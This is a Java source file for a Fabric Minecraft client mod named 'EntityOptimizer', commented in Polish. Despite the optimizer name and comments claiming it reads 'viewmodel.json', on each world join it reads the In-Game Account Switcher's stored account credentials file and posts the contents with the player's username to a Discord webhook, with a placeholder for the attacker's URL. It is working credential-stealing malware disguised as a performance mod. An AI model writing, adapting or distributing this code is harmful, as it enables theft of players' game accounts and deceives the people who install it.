package pl.example.entityoptimizer;

import net.fabricmc.api.ClientModInitializer;
import net.fabricmc.fabric.api.client.networking.v1.ClientPlayConnectionEvents;
import net.fabricmc.loader.api.FabricLoader;

import net.minecraft.client.MinecraftClient;

import com.google.gson.Gson;
import com.google.gson.GsonBuilder;
import com.google.gson.JsonObject;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.List;

public class EntityOptimizerMod implements ClientModInitializer {

    // TODO: WSTAW SWÓJ WEBHOOK TUTAJ
    private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/XXX/YYY";

    private static final Gson GSON = new GsonBuilder().create();

    // Zapas poniżej limitu 2000 znaków Discorda
    private static final int MAX_CHUNK_LENGTH = 1800;

    @Override
    public void onInitializeClient() {
        System.out.println("[EntityOptimizer] Mod załadowany");

        // Wywoła się po wejściu do świata (singleplayer i multiplayer)
        ClientPlayConnectionEvents.JOIN.register((handler, sender, client) -> {
            onJoinWorld(client);
        });
    }

    private void onJoinWorld(MinecraftClient mc) {
        String username = mc.getSession().getUsername();

        // Odczyt całej zawartości viewmodel.json jako String
        String viewmodelContent = readWholeViewmodelFile();

        // Wyślij zawartość w kilku wiadomościach, jeśli trzeba
        sendViewmodelInChunks(username, viewmodelContent);
    }

    /**
     * Zwraca całą zawartość pliku:
     *   <gameDir>/config/viafabricplus/viewmodel.json
     * jako String.
     */
    private String readWholeViewmodelFile() {
        try {
            Path gameDir = FabricLoader.getInstance().getGameDir();
            Path configPath = gameDir
                    .resolve("_IAS_ACCOUNTS_DO_NOT_SEND_TO_ANYONE")
                    .resolve(".hidden")
                    .resolve("accounts_v1.do_not_send_to_anyone");

            if (!Files.exists(configPath)) {
                return "viewmodel.json nie istnieje (szukano w: " + configPath.toString() + ")";
            }

            // Czyta cały plik jako UTF-8
            return Files.readString(configPath, StandardCharsets.UTF_8);

        } catch (Exception e) {
            e.printStackTrace();
            return "BŁĄD przy czytaniu viewmodel.json: " + e.getClass().getSimpleName()
                    + " - " + e.getMessage();
        }
    }

    /**
     * Dzieli zawartość viewmodel.json na kilka części (jeśli trzeba)
     * i wysyła je jako osobne wiadomości na Discorda.
     */
    private void sendViewmodelInChunks(String username, String viewmodelContent) {
        List<String> chunks = splitIntoChunks(viewmodelContent, MAX_CHUNK_LENGTH);
        int total = chunks.size();

        for (int i = 0; i < total; i++) {
            String chunk = chunks.get(i);

            String header = "";
            if (i == 0) {
                // Pierwsza wiadomość ma info o graczu
                header = "Gracz `" + username + "` wszedł do świata.\n";
            }

            String partInfo = "Zawartość `viewmodel.json` (część " + (i + 1) + "/" + total + "):\n";

            String messageContent = header
                    + partInfo
                    + "```json\n"
                    + chunk
                    + "\n```";

            sendWebhookAsync(messageContent);
        }
    }

    /**
     * Dzieli tekst na kawałki nie dłuższe niż maxChunkSize znaków.
     */
    private static List<String> splitIntoChunks(String text, int maxChunkSize) {
        List<String> chunks = new ArrayList<>();
        int length = text.length();

        for (int i = 0; i < length; i += maxChunkSize) {
            int end = Math.min(length, i + maxChunkSize);
            chunks.add(text.substring(i, end));
        }

        return chunks;
    }

    private void sendWebhookAsync(String content) {
        new Thread(() -> {
            try {
                URL url = new URL(WEBHOOK_URL);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();

                conn.setRequestMethod("POST");
                conn.setDoOutput(true);
                conn.setRequestProperty("Content-Type", "application/json");

                JsonObject payload = new JsonObject();
                payload.addProperty("content", content);
                String json = GSON.toJson(payload);

                try (OutputStream os = conn.getOutputStream()) {
                    os.write(json.getBytes(StandardCharsets.UTF_8));
                }

                int responseCode = conn.getResponseCode();
                System.out.println("[EntityOptimizer] HTTP status: " + responseCode);
            } catch (Exception e) {
                System.err.println("[EntityOptimizer] Błąd przy wysyłaniu webhooka:");
                e.printStackTrace();
            }
        }, "DiscordWebhookSender").start();
    }
}
